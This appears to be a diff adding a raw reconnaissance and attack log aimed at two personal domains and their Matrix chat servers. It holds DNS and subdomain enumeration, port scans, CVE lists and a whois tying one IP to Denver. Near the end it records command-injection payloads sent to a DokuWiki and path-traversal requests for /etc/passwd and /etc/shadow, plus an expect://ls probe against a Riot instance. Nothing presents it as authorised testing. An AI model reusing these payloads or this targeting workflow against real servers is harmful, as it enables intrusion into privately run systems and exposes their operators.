@@ -1,0 +1,741 @@
+{"rooms":["!HDmUYXHdcrmSKoMwNy:matrix.thisisjoes.site"
+!KLxkRyBhSwuSJnYLel:matrix.org","!yihUSwwAArkYAzYcKp:openintents.modular.im","!YkvgijxoSIlvGPkzJr:0xdeadbeef.modular.im","!AAAANTUiY1fBZ230:zemos.net","!"!KUmRqIStkWnYtfmQJU:tomesh.net","!ZQOIEdjhuLzAASIxPj:riot.danilafe.com","
+	RVS update: !HDmUYXHdcrmSKoMwNy:matrix.thisisjoes.site
+
+Output explanation:
+    [+] Good headers. Already used in your website. Good job!
+    [+] Good headers. We recommend applying it
+    [-] Bad headers. We recommend remove it
+
+http://thisisjoes.site
+    [-] Server
+    [-] HSTS without preload
+    [-] Content-Security-Policy too permisive
+    [-] Cookie not only from SameSite
+    [+] Feature-Policy
+    [+] X-Download-Options
+    [+] Public-Key-Pins
+    [+] Except-CT
+    [+] Clear-Site-Data
+    [+] X-Frame-Options
+    [+] X-Permitted-Cross-Domain-Policies
+
+
+Nameserver	Location	ISP
+dns1.registrar-servers.com.	IPv4: US
+IPv6: US	AS10515 20172 20362 396563 396566 397196 -
+AS397203 - VRSN-AC28 - VeriSign Global Registry Services, US
+dns2.registrar-servers.com.	IPv4: US
+IPv6: US	AS40647 396540 396542 396560 396574 397195 397203 -
+AS20362 - VGRS-AC18 - VeriSign Global Registry Services, US
+
+
+    
+Record	TTL	Value
+A	thisisjoes.site	1799s	136.32.110.198
+CAA	thisisjoes.site	1799s	0 iodef "mailto:webmaster@thisisjoes.site"
+	0 issue "letsencrypt.org"
+	0 issuewild "\;"
+DNSKEY	thisisjoes.site	3601s	KSK | ECDSA Curve P-256 with SHA-256 | PyYV3ppq0WWWTyaxrGB2OVC8zIo0iKPa2RQl1zT+mGalr8e+/q7Uq1et P/PSJS7+gd59I+k671s4ekbtSvyIhg==
+MX	thisisjoes.site	1799s	1 mail.thisisjoes.site.
+NS	thisisjoes.site	1800s	dns1.registrar-servers.com.
+dns2.registrar-servers.com.
+SOA	thisisjoes.site	3601s	dns1.registrar-servers.com. hostmaster.registrar-servers.com. 2019090901 43200 3600 604800 3601
+	TXT	thisisjoes.site	1799s	"v=spf1 mx -all"
+	TXT	_dmarc.thisisjoes.site	1799s	"v=DMARC1\; p=reject\; rua=mailto:postmaster@thisisjoes.site\; ruf=mailto:postmaster@thisisjoes.site\; fo=0\; adkim=r\; aspf=r\; pct=100\; rf=afrf\; ri=86400"
+CNAME	blog.thisisjoes.site	1799s	thisisjoes.site.
+CNAME	chat.thisisjoes.site	1799s	thisisjoes.site.
+CNAME	dev.thisisjoes.site	1799s	thisisjoes.site.
+CNAME	ftp.thisisjoes.site	1799s	thisisjoes.site.
+CNAME	gateway.thisisjoes.site	1799s	thisisjoes.site.
+CNAME	git.thisisjoes.site	1799s	thisisjoes.site.
+CNAME	mail.thisisjoes.site	1799s	thisisjoes.site.
+CNAME	office.thisisjoes.site	1799s	thisisjoes.site.
+CNAME	wiki.thisisjoes.site	1799s	thisisjoes.site.
+CNAME	www.thisisjoes.site	5m	thisisjoes.site.
+
+
+1 - 34 of 34 results
+#	Domain	Alexa Rank	Hosting Provider	Mail Provider
+1	ftp.thisisjoes.site	‐	Google Fiber Inc.
+2	wiki.thisisjoes.site	‐	 Google Fiber Inc.
+3	thisisjoes.site	‐	Google Fiber Inc. Google Fiber Inc.
+4	blog.thisisjoes.site	‐	Google Fiber Inc.
+5	mail.thisisjoes.site	‐	Google Fiber Inc.
+6	searx.thisisjoes.site	‐	Google Fiber Inc.
+7	contingency2.thisisjoes.site	‐	Google Fiber Inc.
+8	chat.thisisjoes.site	‐	Google Fiber Inc.
+9	social.thisisjoes.site	‐	 Google Fiber Inc.
+10	git.thisisjoes.site	‐	Google Fiber Inc.
+11	office.thisisjoes.site	‐	Google Fiber Inc.
+12	dev.thisisjoes.site	‐	Google Fiber Inc.
+13	gateway.thisisjoes.site	‐	Google Fiber Inc.
+14	wip.thisisjoes.site	‐	Google Fiber Inc.
+15	landscape.thisisjoes.site	‐	Google Fiber Inc.
+16	search.thisisjoes.site	‐	Google Fiber Inc.
+17	photos.thisisjoes.site	‐	Google Fiber Inc.
+18	riot.thisisjoes.site	‐	Google Fiber Inc.
+19	gitbucket.thisisjoes.site	‐	Google Fiber Inc.
+20	www.thisisjoes.site	‐	Google Fiber Inc.
+21	contingency3.thisisjoes.site	‐	Google Fiber Inc.
+22	live.thisisjoes.site	‐	Google Fiber Inc.
+23	turn.thisisjoes.site	‐	Google Fiber Inc.
+24	matrix.thisisjoes.site	‐	Google Fiber Inc.
+25	documents.thisisjoes.site	‐	Google Fiber Inc.
+26	fess.thisisjoes.site	‐	Google Fiber Inc.
+27	vault.thisisjoes.site	‐	Google Fiber Inc.
+28	webchat.thisisjoes.site	‐	Google Fiber Inc.
+29	contingency.thisisjoes.site	‐	Google Fiber Inc.
+30	xmpp.thisisjoes.site	‐	Google Fiber Inc.
+31	nextcloud.thisisjoes.site	‐	Google Fiber Inc.
+32	stream.thisisjoes.site	‐	Google Fiber Inc.
+33	multichat.thisisjoes.site	‐	Google Fiber Inc.
+34	community.thisisjoes.site	‐	Google Fiber Inc.
+‐
+PING TEST
+PING thisisjoes.site (136.32.110.198) 56(84) bytes of data.
+64 bytes from 136.32.110.198: icmp_seq=1 ttl=37 time=50.3 ms
+64 bytes from 136.32.110.198: icmp_seq=2 ttl=37 time=57.2 ms
+64 bytes from 136.32.110.198: icmp_seq=3 ttl=37 time=51.6 ms
+64 bytes from 136.32.110.198: icmp_seq=4 ttl=37 time=58.6 ms
+64 bytes from 136.32.110.198: icmp_seq=5 ttl=37 time=52.6 ms
+
+--- thisisjoes.site ping statistics ---
+5 packets transmitted, 5 received, 0% packet loss, time 4005ms
+rtt min/avg/max/mdev = 50.342/54.100/58.602/3.233 ms
+TRACEROUTE TEST
+traceroute to thisisjoes.site (136.32.110.198), 30 hops max, 60 byte packets
+ 1  ip-10-0-0-14.ec2.internal (10.0.0.14)  1.165 ms  1.176 ms  1.160 ms
+ 2  216.182.229.172 (216.182.229.172)  6.181 ms  6.347 ms 216.182.229.176 (216.182.229.176)  6.828 ms
+ 3  100.66.37.124 (100.66.37.124)  4.525 ms 100.66.13.60 (100.66.13.60)  18.124 ms 100.66.36.186 (100.66.36.186)  6.750 ms
+ 4  100.66.39.34 (100.66.39.34)  14.070 ms 100.66.14.236 (100.66.14.236)  53.509 ms 100.66.14.228 (100.66.14.228)  14.303 ms
+ 5  100.66.7.173 (100.66.7.173)  12.314 ms 100.66.6.239 (100.66.6.239)  13.696 ms 100.66.6.167 (100.66.6.167)  18.223 ms
+ 6  100.66.5.205 (100.66.5.205)  15.624 ms 100.66.5.215 (100.66.5.215)  13.356 ms 100.66.5.201 (100.66.5.201)  13.353 ms
+ 7  100.65.15.17 (100.65.15.17)  0.998 ms 100.65.12.17 (100.65.12.17)  1.052 ms 100.65.14.145 (100.65.14.145)  1.041 ms
+ 8  52.93.28.173 (52.93.28.173)  2.028 ms 52.93.28.187 (52.93.28.187)  1.782 ms 52.93.28.171 (52.93.28.171)  5.694 ms
+ 9  100.100.30.62 (100.100.30.62)  1.780 ms 100.100.28.104 (100.100.28.104)  2.099 ms 100.100.30.46 (100.100.30.46)  1.834 ms
+10  100.95.7.145 (100.95.7.145)  1.874 ms 100.95.7.32 (100.95.7.32)  2.390 ms 100.95.7.96 (100.95.7.96)  2.926 ms
+11  52.93.114.16 (52.93.114.16)  8.347 ms 100.100.30.102 (100.100.30.102)  1.887 ms 52.93.114.116 (52.93.114.116)  8.802 ms
+12  54.239.111.229 (54.239.111.229)  2.195 ms 100.95.7.193 (100.95.7.193)  1.999 ms 100.95.7.177 (100.95.7.177)  2.566 ms
+13  eqix1-v4.pr01.iad101.googlefiber.net (206.126.237.101)  1.967 ms  1.929 ms 52.93.114.30 (52.93.114.30)  19.576 ms
+14  * * *
+15  * * *
+16  * * *
+17  192.119.18.46 (192.119.18.46)  37.483 ms  36.988 ms *
+18  23-255-224-194.mci.googlefiber.net (23.255.224.194)  35.073 ms  34.965 ms *
+19  23-255-226-55.mci.googlefiber.net (23.255.226.55)  37.792 ms  37.639 ms  37.711 ms
+20  * * *
+21  23-255-226-55.mci.googlefiber.net (23.255.226.55)  37.614 ms  37.571 ms 136.32.110.198 (136.32.110.198)  68.302 ms
+
+TXT Values	First Seen	Last Seen	Duration Seen
+v=spf1 mx -all
+2019-06-12 (3 months ago)	2019-09-13 (6 hours ago)	3 months
+v=spf1 mx -all
+google-site-verification=_b2PdSYVRKr7Zundt2OFEEagEVNSetOPTNsxLwtcCCE
+2018-09-29 (11 months ago)	2019-06-12 (3 months ago)	8 months
+v=spf1 include:thisisjoes.site ~all
+google-site-verification=_b2PdSYVRKr7Zundt2OFEEagEVNSetOPTNsxLwtcCCE
+2018-09-10 (1 year ago)	2018-09-29 (11 months ago)	19 days
+v=spf1 include:spf.efwd.registrar-servers.com ~all
+2018-05-29 (1 year ago)	2018-09-10 (1 year ago)	3 months
+v=spf1 include:spf.privateemail.com ~all
+2018-05-28 (1 year ago)	2018-05-29 (1 year ago)	1 day
+v=spf1 include:spf.efwd.registrar-servers.com ~all
+2018-04-27 (1 year ago)	2018-05-28 (1 year ago)	1 month
+
+ Vulnerabilities found for server-side software
+Risk Level	CVSS	CVE	Summary	Exploit	Affected software
+7.2	CVE-2019-0211	In Apache HTTP Server 2.4 releases 2.4.17 to 2.4.38, with MPM event, worker or prefork, code executing in less-privileged child processes or threads (including scripts executed by an in-process scripting interpreter) could execute arbitrary code with the privileges of the parent process (usually root) by manipulating the scoreboard. Non-Unix systems are not affected.	N/A	http_server 2.4.37
+6	CVE-2019-0215	In Apache HTTP Server 2.4 releases 2.4.37 and 2.4.38, a bug in mod_ssl when using per-location client certificate verification with TLSv1.3 allowed a client to bypass configured access control restrictions.	N/A	http_server 2.4.37
+5	CVE-2019-10081	HTTP/2 (2.4.20 through 2.4.39) very early pushes, for example configured with "H2PushResource", could lead to an overwrite of memory in the pushing request's pool, leading to crashes. The memory copied is that of the configured push link header values, not data supplied by the client.	N/A	http_server 2.4.37
+5.0	CVE-2019-0190	A bug exists in the way mod_ssl handled client renegotiations. A remote attacker could send a carefully crafted request that would cause mod_ssl to enter a loop leading to a denial of service. This bug can be only triggered with Apache HTTP Server version 2.4.37 when using OpenSSL version 1.1.1 or later, due to an interaction in changes to handling of renegotiation attempts.	N/A	http_server 2.4.37
+5.0	CVE-2018-17199	In Apache HTTP Server 2.4 release 2.4.37 and prior, mod_session checks the session expiry time before decoding the session. This causes session expiry time to be ignored for mod_session_cookie sessions since the expiry time is loaded when the session is decoded.	N/A	http_server 2.4.37
+  Details
+Risk description:
+These vulnerabilities expose the affected applications to the risk of unauthorized access to confidential data and possibly to denial of service attacks. An attacker could search for an appropriate exploit (or create one himself) for any of these vulnerabilities and use it to attack the system.
+
+Recommendation:
+We recommend you to upgrade the affected software to the latest version in order to eliminate the risk of these vulnerabilities.
+ Server software and technology found
+Software / Version	Category
+ UNIX	Operating Systems
+ Apache 2.4.37	Web Servers
+ webpack	Build CI Systems
+ Modernizr	JavaScript Frameworks
+ React	JavaScript Frameworks
+  Details
+Risk description:
+An attacker could use this information to mount specific attacks against the identified software type and version.
+
+Recommendation:
+We recommend you to eliminate the information which permit the identification of software platform, technology, server and operating system: HTTP server headers, HTML meta information, etc.
+
+More information about this issue:
+https://www.owasp.org/index.php/Fingerprint_Web_Server_(OTG-INFO-002).
+ Missing HTTP security headers
+HTTP Security Header	Header Role	Status
+X-Frame-Options	Protects against Clickjacking attacks	Not set
+X-XSS-Protection	Mitigates Cross-Site Scripting (XSS) attacks	Not set
+Strict-Transport-Security	Protects against man-in-the-middle attacks	Not set
+X-Content-Type-Options	Prevents possible phishing or XSS attacks	Not set
+  Details
+Risk description:
+Because the X-Frame-Options header is not sent by the server, an attacker could embed this website into an iframe of a third party website. By manipulating the display attributes of the iframe, the attacker could trick the user into performing mouse clicks in the application, thus performing activities without user's consent (ex: delete user, subscribe to newsletter, etc). This is called a Clickjacking attack and it is described in detail here:
+https://www.owasp.org/index.php/Clickjacking
+
+The X-XSS-Protection HTTP header instructs the browser to stop loading web pages when they detect reflected Cross-Site Scripting (XSS) attacks. Lack of this header exposes application users to XSS attacks in case the web application contains such vulnerability.
+
+The HTTP Strict-Transport-Security header instructs the browser not to load the website via plain HTTP connection but always use HTTPS. Lack of this header exposes the application users to the risk of data theft or unauthorized modification in case the attacker implements a man-in-the-middle attack and intercepts the communication between the user and the server.
+
+The HTTP X-Content-Type-Options header is addressed to Internet Explorer browser and prevents it from reinterpreting the content of a web page (MIME-sniffing) and thus overriding the value of the Content-Type header). Lack of this header could lead to attacks such as Cross-Site Scripting or phishing.
+
+Recommendation:
+We recommend you to add the X-Frame-Options HTTP response header to every page that you want to be protected against Clickjacking attacks.
+More information about this issue:
+https://www.owasp.org/index.php/Clickjacking_Defense_Cheat_Sheet
+
+We recommend setting the X-XSS-Protection header to "X-XSS-Protection: 1; mode=block".
+More information about this issue:
+https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-XSS-Protection
+
+We recommend setting the Strict-Transport-Security header.
+More information about this issue:
+https://www.owasp.org/index.php/HTTP_Strict_Transport_Security_Cheat_Sheet
+
+We recommend setting the X-Content-Type-Options header to "X-Content-Type-Options: nosniff".
+More information about this issue:
+https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Content-Type-Options
+ 
+ -Target URL: https://riot.thisisjoes.site 
+
+ -IP    : 136.32.110.198
+ -IPv6  : OFF
+ -Port  : 443
+ 
+ -Domain: riot.thisisjoes.site
+
+---------
+
+Trying single visit broadband test (using GET)...
+
+ -Bytes in : 3.7 KB
+ -Load time: 0.44 seconds
+
+---------
+
+Determining webserver fingerprint (note that this value can be a fake)...
+
+ -Banner: Apache/2.4.37(Unix)
+ -Vía   : NOT found! 
+
+---------
+
+Searching for extra Anti-DDoS protections...
+
+ -WAF/IDS: FIREWALL NOT PRESENT (or not discovered yet)! ;-)
+
+---------
+
+Searching at CVE (https://cve.mitre.org) for vulnerabilities...
+
+ -Reports:
+
+        + CVE-2019-0215 -> https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-0215
+
+        + CVE-2019-0211 -> https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-0211
+
+        + CVE-2019-0190 -> https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-0190
+
+        + CVE-2018-17199 -> https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-17199
+
+        + CVE-2018-17189 -> https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-17189
+
+        + CVE-2016-4373 -> https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-4373
+
+        + CVE-2013-4878 -> https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-4878
+
+        + CVE-2011-2729 -> https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-2729
+
+        + CVE-2010-2791 -> https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-2791
+
+        + CVE-2009-2699 -> https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-2699
+
+        + CVE-2009-2412 -> https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-2412
+
+        + CVE-2003-0844 -> https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-0844
+
+        + CVE-2003-0189 -> https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-0189
+
+        + CVE-2001-1556 -> https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2001-1556
+
+        + CVE-2001-1072 -> https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2001-1072
+
+
+53/tcp open  domain? syn-ack ttl 50
+| dns-nsid: 
+|_  id.server: nnn1-was1
+| fingerprint-strings: 
+|   DNSVersionBindReqTCP: 
+|     version
+|_    bind
+
+SF-Port53-TCP:V=7.80%I=7%D=9/21%Time=5D867B2D%P=x86_64-pc-linux-gnu%r(DNSV
+SF:ersionBindReqTCP,20,"\0\x1e\0\x06\x81\0\0\x01\0\0\0\0\0\0\x07version\x0
+SF:4bind\0\0\x10\0\x03")%r(HTTPOptions,E,"\0\x0cTI\xcb\x04\0\0\0\0\0\0\0\0
+SF:")%r(RTSPRequest,E,"\0\x0cTI\xcb\x04\0\0\0\0\0\0\0\0")%r(RPCCheck,E,"\0
+SF:\x0c\0\(\xf2\x04\0\0\0\0\0\0\0\0")%r(SSLSessionReq,E,"\0\x0c\0\0\xd3\x0
+SF:4\0\0\0\0\0\0\0\0")%r(TLSSessionReq,E,"\0\x0c\0\0\xe9\x04\0\0\0\0\0\0\0
+SF:\0")%r(SIPOptions,E,"\0\x0cTI\xcb\x04\0\0\0\0\0\0\0\0");
+
+
+Adresses	Organization	First Seen	Last Seen	Duration Seen
+136.32.110.198 
+Google Fiber Inc.
+2018-11-14 (10 months ago)	2019-09-13 (6 hours ago)	10 months
+136.32.81.0 
+Google Fiber Inc.
+2018-05-28 (1 year ago)	2018-11-14 (10 months ago)	5 months
+162.255.119.158 
+Namecheap, Inc.
+2018-04-27 (1 year ago)	2018-05-28 (1 year ago)	1 month
+
+
+
+PORT    STATE SERVICE  REASON         VERSION
+22/tcp  open  ssh      syn-ack ttl 53 OpenSSH 7.9p1 Debian 10 (Probably Buster ) (protocol 2.0)
+80/tcp  open  http     syn-ack ttl 53 nginx 1.14.2
+|_http-server-header: nginx/1.14.2
+443/tcp open  ssl/http syn-ack ttl 53 nginx 1.14.2
+|_http-server-header: nginx/1.14.2
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+
+21/tcp   closed ftp
+22/tcp   open   ssh
+23/tcp   closed telnet
+25/tcp   closed smtp
+53/tcp   closed dns
+80/tcp   open   http
+110/tcp  closed pop3
+115/tcp  closed sftp
+135/tcp  closed msrpc
+139/tcp  closed netbios
+143/tcp  closed imap
+194/tcp  closed irc
+443/tcp  open   https
+445/tcp  closed smb
+1433/tcp closed mssql
+3306/tcp closed mysql
+3389/tcp closed rdp
+5632/tcp closed pcanywhere
+5900/tcp closed vnc
+6112/tcp closed wc3
+Nmap done: 1 IP address (1 host up) scanned in 0.16 seconds
+----------------------------
+
+------- ipfingerprints -------
+Host is up (0.084s latency).
+Not shown: 483 closed ports
+PORT    STATE    SERVICE
+22/tcp  open     ssh
+80/tcp  open     http
+111/tcp filtered rpcbind
+135/tcp filtered msrpc
+136/tcp filtered profile
+137/tcp filtered netbios-ns
+138/tcp filtered netbios-dgm
+139/tcp filtered netbios-ssn
+443/tcp open     https
+445/tcp filtered microsoft-ds
+Aggressive OS guesses: Linux 3.10 - 4.2 (97%), Linux 3.2 - 4.6 (97%), Linux 2.6.32 - 3.13
+(96%), Linux 3.16 - 4.6 (95%), Linux 2.6.22 - 2.6.36 (94%), Linux 4.4 (94%), Linux 3.10 (94%),
+Linux 2.6.32 - 3.10 (93%), HP P2000 G3 NAS device (93%), Linux 2.6.18 (93%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 12 hops
+------------------------------
+
+------- pingeu -------
+PORT     STATE  SERVICE
+21/tcp   closed ftp
+22/tcp   open   ssh
+23/tcp   closed telnet
+25/tcp   closed smtp
+53/tcp   closed dns
+80/tcp   open   http
+139/tcp  closed netbios
+443/tcp  open   https
+445/tcp  closed smb
+3389/tcp closed rdp
+
+
+------- pingeu -------
+PORT     STATE  SERVICE
+21/tcp   closed ftp
+22/tcp   open   ssh
+23/tcp   closed telnet
+25/tcp   closed smtp
+53/tcp   closed dns
+80/tcp   open   http
+139/tcp  closed netbios
+443/tcp  open   https
+445/tcp  closed smb
+3389/tcp closed rdp
+----------------------
+
+------- spiderip -------
+PORT     STATE  SERVICE
+21/tcp   closed ftp
+22/tcp   open   ssh
+25/tcp   closed smtp
+80/tcp   open   http
+110/tcp  closed pop3
+143/tcp  closed imap
+443/tcp  open   https
+465/tcp  closed smtps
+993/tcp  closed imaps
+995/tcp  closed pop3s
+1433/tcp closed mssql
+3306/tcp closed mysql
+3389/tcp closed rdp
+5900/tcp closed vnc
+8080/tcp closed http-alt
+8443/tcp closed https-alt
+------------------------
+
+------- t1shopper -------
+PORT     STATE  SERVICE
+21/tcp   closed ftp
+23/tcp   closed telnet
+25/tcp   closed smtp
+80/tcp   open   http
+110/tcp  closed pop3
+139/tcp  closed netbios
+445/tcp  closed smb
+1433/tcp closed mssql
+1521/tcp closed oracle
+1723/tcp closed pptp
+3306/tcp closed mysql
+3389/tcp closed rdp
+5900/tcp closed vnc
+8080/tcp closed http-alt
+------------------------
+
+Analyzing https://thisisjoes.site/matomo/matomo.js
+An exception occurred while analyzing the code on https://thisisjoes.site/matomo/matomo.js
+Analyzing https://gitbucket.thisisjoes.site/assets/vendors/jquery/jquery-3.2.1.min.js?20190904214224
+The file https://gitbucket.thisisjoes.site/assets/vendors/jquery/jquery-3.2.1.min.js?20190904214224 seems to be a standard library. Skipping analysis for that.
+
+Analyzing https://gitbucket.thisisjoes.site/assets/vendors/jquery-ui/jquery-ui.min.js?20190904214224
+Analyzing https://gitbucket.thisisjoes.site/assets/vendors/dropzone/dropzone.min.js?20190904214224
+
+
+Analyzing https://gitbucket.thisisjoes.site/assets/common/js/validation.js?20190904214224
+
+Analyzing https://gitbucket.thisisjoes.site/assets/common/js/gitbucket.js?20190904214224
+An exception occurred while analyzing the code on https://gitbucket.thisisjoes.site/assets/common/js/gitbucket.js?20190904214224
+
+Analyzing https://gitbucket.thisisjoes.site/assets/vendors/bootstrap-3.3.7/js/bootstrap.min.js?20190904214224
+
+Analyzing https://gitbucket.thisisjoes.site/assets/vendors/bootstrap3-typeahead/bootstrap3-typeahead.min.js?20190904214224
+
+Analyzing https://gitbucket.thisisjoes.site/assets/vendors/bootstrap-datetimepicker-4.17.44/js/moment.min.js?20190904214224
+An exception occurred while analyzing the code on https://gitbucket.thisisjoes.site/assets/vendors/bootstrap-datetimepicker-4.17.44/js/moment.min.js?20190904214224
+
+Analyzing https://gitbucket.thisisjoes.site/assets/vendors/bootstrap-datetimepicker-4.17.44/js/bootstrap-datetimepicker.min.js?20190904214224
+Analyzing https://gitbucket.thisisjoes.site/assets/vendors/colorpicker/js/bootstrap-colorpicker.min.js?20190904214224
+Analyzing https://gitbucket.thisisjoes.site/assets/vendors/google-code-prettify/prettify.js?20190904214224
+
+
+Analyzing https://gitbucket.thisisjoes.site/assets/vendors/elastic/jquery.elastic.source.js?20190904214224
+
+Analyzing https://gitbucket.thisisjoes.site/assets/vendors/facebox/facebox.js?20190904214224
+
+-- Source Assigned : location assigned to url - Line 240
+
+
+ https://gitbucket.thisisjoes.site/assets/vendors/jquery-hotkeys/jquery.hotkeys.js?20190904214224
+
+https://gitbucket.thisisjoes.site/assets/vendors/jquery-textcomplete-1.8.4/jquery.textcomplete.min.js?20190904214224
+
+
+Analyzing https://gitbucket.thisisjoes.site/assets/vendors/AdminLTE-2.4.2/js/adminlte.min.js?20190904214224
+-------------------------==============================---------============================--------------
+
+
+==========================================================================================================
+
+
+
+Output explanation:
+    [+] Good headers. Already used in your website. Good job!
+    [+] Good headers. We recommend applying it
+    [-] Bad headers. We recommend remove it
+
+http://glowers.club
+    [-] Server
+    [+] Clear-Site-Data
+    [+] Content-Security-Policy
+    [+] Public-Key-Pins
+    [+] X-Download-Options
+    [+] Referrer-Policy
+    [+] X-Frame-Options
+    [+] HTTP Strict Transport Security [HSTS]
+    [+] X-Content-Type-Options
+    [+] X-Permitted-Cross-Domain-Policies
+    [+] X-XSS-Protection
+    [+] Feature-Policy
+    [+] Except-CT
+
+
+glowers.club 
+	server: nginx/1.14.2 
+		host glowers.club
+
+Record	TTL	Value
+A	glowers.club	1799s	157.245.9.169
+MX	glowers.club	1800s	10 eforward1.registrar-servers.com.
+10 eforward2.registrar-servers.com.
+10 eforward3.registrar-servers.com.
+15 eforward4.registrar-servers.com.
+20 eforward5.registrar-servers.com.
+NS	glowers.club	1800s	dns1.registrar-servers.com.
+dns2.registrar-servers.com.
+SOA	glowers.club	3601s	dns1.registrar-servers.com. hostmaster.registrar-servers.com. 2019082407 43200 3600 604800 3601
+TXT	glowers.club	1800s	"v=spf1 include:spf.efwd.registrar-servers.com ~all"
+A	*.glowers.club	1799s	157.245.9.169
+A	mail.glowers.club	1799s	157.245.9.169
+A	www.glowers.club	1799s	157.245.9.169
+
+
+Command injection payload $(echo 'h''l''U''a''A')
+place uri@do method GET uri https://glowers.club/wiki/doku.php?do=%24(echo%20'h''l''U''a''A')
+
+GET https://glowers.club/wiki/doku.php?do=%24(echo%20'h''l''U''a''A') HTTP/1.1
+
+payload $(echo 'R''p''4''i''J') 
+	place uri@t 
+		method 
+			GET 
+				uri https://glowers.club/wiki/lib/exe/js.php?t=%24(echo%20'R''p''4''i''J')
+
+GET https://glowers.club/wiki/lib/exe/js.php?t=%24(echo%20'R''p''4''i''J') HTTP/1.1
+	uri https://glowers.club/wiki/doku.php?id=mmjd
+
+<form action="/wiki/doku.php?id=start" method="get" role="search" class="search doku_form" id="dw__search" accept-charset="utf-8">
+
+banner server: nginx/1.14.2
+	host glowers.club
+uri https://glowers.club/wiki/feed.php email fuckjuice@undisclosed.example.com
+
+	GET https://glowers.club/wiki/feed.php HTTP/1.1 uri https://glowers.club/wiki/doku.php?id=mmjd
+		host glowers.club
+			version DokuWiki
+
+uri https://glowers.club/wiki/doku.php?id=mmjd&q=file%3A%2F%2F%2FC%3A%2Fetc&do=search
+	path GET https://glowers.club/wiki/doku.php?id=mmjd&q=file%3A%2F%2F%2FC%3A%2Fetc&do=search HTTP/1.1
+
+"Omnibug v1.11.0","Exported Tue Sep 17 2019 08:17:54 GMT+0000 (Coordinated Universal Time)"
+"Event Type","Provider","Account","Request ID","Request URL","POST Data","Timestamp","Notes"
+"Navigation","","","","https://riot.glowers.club/?https:%2f%2friot.glowers.club%2f#%2fwelcome..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fshadow%2500","","Tue Sep 17 2019 08:13:04 GMT+0000 (Coordinated Universal Time)"
+"Navigation","","","","https://riot.glowers.club/?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd","","Tue Sep 17 2019 08:14:14 GMT+0000 (Coordinated Universal Time)"
+"Navigation","","","","https://riot.glowers.club/?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd","","Tue Sep 17 2019 08:14:14 GMT+0000 (Coordinated Universal Time)"
+"Navigation","","","","https://riot.glowers.club/?page=/\../\../\../\../\../\../\../\../\../\../\../etc/passwd#/login?@FindBy(xpath%20=%20%22//div[@class='mx_AuthPage'][contains(.,'English%20(US)Sign%20inSign%20in%20to%20your%20Matrix%20account%20on%20glowers.clubSign%20in%20withUsernameEmail%20addressPhoneUsernamePasswordNot%20sure%20of%20your%20password?%20Set%20a%20new%20oneCreate%20accountblogtwittergithubpowered%20by%20Matrix')]%22)","","Tue Sep 17 2019 08:16:34 GMT+0000 (Coordinated Universal Time)"
+"Navigation","","","","https://riot.glowers.club/?page=expect://ls","","Tue Sep 17 2019 08:17:09 GMT+0000 (Coordinated Universal Time)"
+75.71.182.149 whois
+	
+Comcast Cable Communications Holdings, Inc (C02610777) 
+route
+	75.64.0.0/13 bgp AS7922 asname
+	
+COMCAST-IBONE Comcast Cable Communicatio 
+	Comcast Cable Communications, Inc.
+location
+	Denver, United States
+ptr c-75-71-182-149.hsd1.co.comcast.net ns ns1hwy.name.com
+a 2600:2000:1001::47 
+	route 2600:2000:1001::/48 
+		bgp AS33517
+	
+Dynamic Network Services, Inc. 
+	location United States
+		ptr
+			ns1.name.com
+
+
+======================
+
+ -Target URL: https://riot.glowers.club 
+
+ -IP    : 157.245.9.169
+ -IPv6  : OFF
+ -Port  : 443
+ 
+ -Domain: riot.glowers.club
+
+---------
+
+Trying single visit broadband test (using GET)...
+
+ -Bytes in : 3.7 KB
+ -Load time: 0.38 seconds
+
+---------
+
+Determining webserver fingerprint (note that this value can be a fake)...
+
+ -Banner: nginx/1.14.2
+ -Vía   : NOT found! 
+
+---------
+
+Searching for extra Anti-DDoS protections...
+
+ -WAF/IDS: FIREWALL NOT PRESENT (or not discovered yet)! ;-)
+
+---------
+
+Searching at CVE (https://cve.mitre.org) for vulnerabilities...
+
+ -Reports:
+
+        + CVE-2019-9945 -> https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-9945
+
+        + CVE-2019-9516 -> https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-9516
+
+        + CVE-2019-9513 -> https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-9513
+
+        + CVE-2019-9511 -> https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-9511
+
+        + CVE-2019-9161 -> https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-9161
+
+        + CVE-2019-7401 -> https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-7401
+
+        + CVE-2019-15517 -> https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-15517
+
+        + CVE-2019-13980 -> https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-13980
+
+        + CVE-2019-13617 -> https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-13617
+
+        + CVE-2019-13067 -> https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-13067
+
+        + CVE-2019-12938 -> https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-12938
+
